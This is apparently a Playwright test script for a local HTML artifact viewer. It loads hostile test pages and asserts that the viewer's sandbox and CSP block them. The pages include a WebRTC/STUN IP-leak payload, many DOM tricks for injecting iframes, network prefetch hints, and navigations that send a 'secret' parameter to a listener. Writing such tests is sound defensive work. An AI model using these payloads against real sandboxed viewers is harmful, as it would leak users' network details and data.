import json, urllib.request, time, sys
from playwright.sync_api import sync_playwright
BASE = "http://127.0.0.1:8899"
TOK = open("/tmp/vt/tok").read().strip()
LISTEN = "/tmp/rtcx/listen.log"   # TCP listener on 127.0.0.1:8896 logs every connection
fails = 0
def check(c, m):
    global fails
    print(("PASS " if c else "FAIL ") + m, flush=True)
    if not c: fails += 1
def tool(name, **a):
    r = urllib.request.Request(BASE + "/api/v1/tools/" + name, data=json.dumps(a).encode(), method="POST", headers={"Authorization": "Bearer " + TOK})
    return json.loads(urllib.request.urlopen(r).read())
def conns(): return open(LISTEN).read().count("CONNECT")
def wait_for(fn, timeout=8):
    end = time.time() + timeout
    while time.time() < end:
        try:
            v = fn()
            if v: return v
        except Exception: pass
        time.sleep(0.15)
    return None

CHILD = "<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('x');pc.onicecandidate=e=>{if(e.candidate)parent.postMessage('LEAK:'+e.candidate.type,'*')};pc.createOffer().then(d=>pc.setLocalDescription(d))}catch(e){parent.postMessage('childerr '+e,'*')}<\\/script>"
ATTACK = r"""<!doctype html><html><head><title>attack</title></head><body>
<pre id=out>running</pre>
<iframe id=static srcdoc="%(CHILD_ESC)s"></iframe>
<object data="data:text/html,hi"></object>
<script>
const C = "%(CHILD)s";
const esc = s => s.replace(/&/g,'&amp;').replace(/"/g,'&quot;');
const IF = () => '<iframe srcdoc="' + esc(C) + '"></iframe>';
const mk = () => { const f = document.createElement('iframe'); f.srcdoc = C; return f; };
const log = []; addEventListener('message', e => { if (typeof e.data === 'string') log.push(e.data); });
const res = {};
const t = (name, fn) => { try { fn(); res[name] = 'ok'; } catch (e) { res[name] = 'threw ' + e.name; } };
document.write(IF());
t('main', () => { res.mainRTC = [typeof RTCPeerConnection, typeof webkitRTCPeerConnection, typeof RTCDataChannel, typeof RTCIceCandidate].join('/'); });
t('appendChild', () => document.body.appendChild(mk()));
t('append', () => document.body.append(mk()));
t('insertBefore', () => document.body.insertBefore(mk(), document.body.firstChild));
t('innerHTML', () => { const d = document.createElement('div'); document.body.appendChild(d); d.innerHTML = IF(); });
t('insertAdjacentHTML', () => document.body.insertAdjacentHTML('beforeend', IF()));
t('outerHTML', () => { const d = document.createElement('div'); document.body.appendChild(d); d.outerHTML = IF(); });
t('fragment', () => { const fr = document.createDocumentFragment(); fr.appendChild(mk()); document.body.appendChild(fr); });
t('detached', () => { const d = document.createElement('div'); d.appendChild(mk()); document.body.appendChild(d); });
t('range', () => { const r = document.createRange(); r.selectNodeContents(document.body); r.collapse(false); r.insertNode(mk()); });
t('contextualFragment', () => { const r = document.createRange(); r.selectNode(document.body); document.body.appendChild(r.createContextualFragment(IF())); });
t('execCommand', () => { const d = document.createElement('div'); d.contentEditable = 'true'; document.body.appendChild(d); d.focus(); document.execCommand('insertHTML', false, IF()); });
t('shadowClosed', () => { const h = document.createElement('div'); document.body.appendChild(h); h.attachShadow({mode:'closed'}).innerHTML = IF(); });
t('shadowDetached', () => { const h = document.createElement('div'); h.attachShadow({mode:'closed'}).appendChild(mk()); document.body.appendChild(h); });
t('setHTMLUnsafeDSD', () => { const d = document.createElement('div'); document.body.appendChild(d); d.setHTMLUnsafe('<div><template shadowrootmode="closed">' + IF() + '</template></div>'); });
t('parseHTMLUnsafeDSD', () => { if (!Document.parseHTMLUnsafe) return; const doc = Document.parseHTMLUnsafe('<div id=z><template shadowrootmode="closed">' + IF() + '</template></div>'); document.body.appendChild(document.adoptNode(doc.getElementById('z'))); });
t('domparser', () => { const doc = new DOMParser().parseFromString(IF(), 'text/html'); document.body.appendChild(document.adoptNode(doc.body.firstChild)); });
t('replaceWith', () => { const s = document.createElement('span'); document.body.appendChild(s); s.replaceWith(mk()); });
t('textAfter', () => { const x = document.createTextNode('x'); document.body.appendChild(x); x.after(mk()); });
t('moveBefore', () => { if (!document.body.moveBefore) return; const d = document.createElement('div'); d.appendChild(mk()); document.body.moveBefore(d, null); });
t('object', () => { const o = document.createElement('object'); o.data = 'data:text/html,' + encodeURIComponent(C); document.body.appendChild(o); });
t('embed', () => { const o = document.createElement('embed'); o.src = 'data:text/html,' + encodeURIComponent(C); document.body.appendChild(o); });
// page code that runs in the middle of an insert must not find a frame window
// (the sandbox makes it cross-origin today, but that is not the line we hold)
const grabbed = [];
const g = (n, w) => { if (w) grabbed.push(n); };
customElements.define('x-grab', class extends HTMLElement { constructor() { super(); g('ceConstructor', window[0]); } connectedCallback() { g('ceConnected', window[0]); } });
document.addEventListener('load', e => g('loadEvent', e.target.contentWindow), true);
t('ceInnerHTML', () => { const d = document.createElement('div'); document.body.appendChild(d); d.innerHTML = IF() + '<x-grab></x-grab>'; });
t('ceAppend', () => document.body.append(mk(), document.createElement('x-grab')));
t('scriptAppend', () => { const s = document.createElement('script'); s.textContent = 'g("script", window[0])'; document.body.append(mk(), s); });
t('prefixed', () => { const f = document.createElementNS('http://www.w3.org/1999/xhtml', 'h:iframe'); f.srcdoc = C; document.body.appendChild(f); g('prefixed', window[0]); });
t('tHead', () => { const doc = new DOMParser().parseFromString('<table><thead><tr><td>' + IF() + '</td></tr></thead></table>', 'text/html'); const tb = document.createElement('table'); document.body.appendChild(tb); tb.tHead = doc.querySelector('thead'); g('tHead', window[0]); });
t('writeSplit', () => { document.write('<'); document.write(IF().slice(1)); g('writeSplit', window[0]); });
t('hint', () => { const l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'https://x.example'; document.head.appendChild(l); });
t('hintLater', () => { const l = document.createElement('link'); l.href = 'https://y.example'; document.head.appendChild(l); l.rel = 'dns-prefetch'; });
t('hintRelList', () => { const l = document.createElement('link'); l.href = 'https://z.example'; document.head.appendChild(l); l.relList.add('prefetch'); });
t('openNoClick', () => { res.openResult = String(window.open('http://127.0.0.1:8896/noclick')); });
t('alert', () => { const t0 = Date.now(); alert('x'); confirm('y'); res.alertMs = Date.now() - t0; });
setTimeout(() => {
  res.frames = window.length;
  res.frameEls = document.querySelectorAll('iframe,object,embed').length;
  res.hintsLeft = document.querySelectorAll('link[rel]').length;
  res.grabbed = grabbed;
  res.leaks = log.filter(x => x.startsWith('LEAK') || x.startsWith('childerr'));
  document.getElementById('out').textContent = JSON.stringify(res);
}, 4000);
</script></body></html>"""
esc = lambda s: s.replace("&", "&amp;").replace('"', "&quot;")
ATTACK = ATTACK % {"CHILD": CHILD.replace('"', '\\"'), "CHILD_ESC": esc(CHILD.replace("<\\/script>", "</script>"))}

NAV = """<!doctype html><html><head><title>nav</title><meta http-equiv="refresh" content="1;url=http://127.0.0.1:8896/meta"></head><body>
<form id=f action="http://127.0.0.1:8896/form"><input name=q value=secret></form>
<a id=l1 href="http://127.0.0.1:8893/clicked1">same-frame link</a>
<a id=l2 target=_blank href="http://127.0.0.1:8893/clicked2">new-tab link</a>
<button id=b onclick="window.open('http://127.0.0.1:8893/clicked3')">open</button>
<pre id=out>nav</pre>
<script>
setTimeout(() => { try { document.getElementById('f').requestSubmit(); } catch (e) {} }, 300);
setTimeout(() => { location.href = 'http://127.0.0.1:8896/selfnav?d=secret'; }, 600);
setTimeout(() => { try { top.location = 'http://127.0.0.1:8896/top'; } catch (e) {} }, 900);
</script></body></html>"""

a_attack = tool("create", title="attack", html=ATTACK)["result"]["id"]
# a fake <head> in a comment, so injecting after the first "<head>" would comment the hardening out
a_hidden = tool("create", title="hidden", html=ATTACK.replace("<!doctype html>", "<!doctype html><!--<head>-->", 1))["result"]["id"]
a_nav = tool("create", title="nav", html=NAV)["result"]["id"]
a_click = tool("create", title="click", html=NAV.replace("<meta http-equiv", "<meta data-x").replace("setTimeout(", "void(") )["result"]["id"]

with sync_playwright() as p:
    for engine in ["chromium", "firefox", "webkit"]:
        print("==", engine, flush=True)
        b = getattr(p, engine).launch()
        ctx = b.new_context(viewport={"width": 1100, "height": 800})
        pg = ctx.new_page()
        pg.goto(BASE + "/auth/login?email=marko@test&next=/")
        if not wait_for(lambda: "vit_s" in [c["name"] for c in ctx.cookies()], 3):
            print("SKIP", engine, "(session cookie not kept over http)"); b.close(); continue

        for a, view in [(a_attack, ""), (a_attack, "/raw"), (a_hidden, "")]:
            pg.goto(BASE + "/a/" + a + view)
            fr = pg.frame_locator("#frame")
            out = wait_for(lambda: (lambda t: t if t.startswith("{") else None)(fr.locator("#out").inner_text()), 12)
            r = json.loads(out) if out else {}
            tag = engine + (view or " shell") + (" hidden-head" if a == a_hidden else "")
            check(r.get("mainRTC") == "undefined/undefined/undefined/undefined", tag + ": WebRTC gone from the page: " + str(r.get("mainRTC")))
            check(r.get("leaks") == [], tag + ": no child frame ran WebRTC: " + str(r.get("leaks")))
            check(r.get("grabbed") == [], tag + ": no page code found a frame mid-insert: " + str(r.get("grabbed")))
            check(r.get("frames") == 0 and r.get("frameEls") == 0, tag + ": no frames left (%s windows, %s elements)" % (r.get("frames"), r.get("frameEls")))
            check(r.get("hintsLeft") == 0, tag + ": network hints removed (%s left)" % r.get("hintsLeft"))
            check(r.get("openResult") == "null", tag + ": window.open returns null")
            check(r.get("alertMs", 9999) < 500, tag + ": alert/confirm don't block")
            errs = [k for k, v in r.items() if isinstance(v, str) and v.startswith("threw")]
            print("   attempts that threw (fine either way):", errs)

        for view in ["", "/raw"]:
            c0 = conns()
            pg.goto(BASE + "/a/" + a_nav + view)
            time.sleep(3.5)
            check(conns() == c0, engine + (view or " shell") + ": self-navigation, meta refresh, form and top navigation reach no outside host")
            check("/a/" + a_nav in pg.url, engine + (view or " shell") + ": viewer still in place")

        pg.goto(BASE + "/a/" + a_click)
        fr = pg.frame_locator("#frame")
        fr.locator("#l1").wait_for()
        for sel, want in [("#l1", "clicked1"), ("#l2", "clicked2"), ("#b", "clicked3")]:
            try:
                with ctx.expect_page(timeout=5000) as np:
                    fr.locator(sel).click()
                u = np.value.url
                np.value.close()
            except Exception as e:
                u = "none: " + str(e)[:60]
            check(want in u, engine + ": click on %s opens a new tab: %s" % (sel, u[-40:]))
        if engine == "chromium":
            d = pg.request.get(BASE + "/c/" + a_click + "/1", headers={"Sec-Fetch-Dest": "document"}, max_redirects=0)
            check(d.status == 302 and d.headers["location"].endswith("/a/" + a_click + "/v/1"), "frame URL opened top-level redirects to the viewer")
            h = pg.request.get(BASE + "/a/" + a_click).headers["content-security-policy"]
            check("frame-src " + BASE + "/c/;" in h, "shell frame-src is /c/ only")
            c = pg.request.get(BASE + "/c/" + a_click + "/1", headers={"Sec-Fetch-Dest": "iframe"}).headers
            check("allow-popups" not in c["content-security-policy"] and "allow-modals" not in c["content-security-policy"] and "frame-src 'none'" in c["content-security-policy"], "page CSP: no popups, no modals, no frames")
            check(c.get("permissions-policy", "").startswith("camera=()"), "page permissions policy")
        b.close()
print("FAILS:", fails)
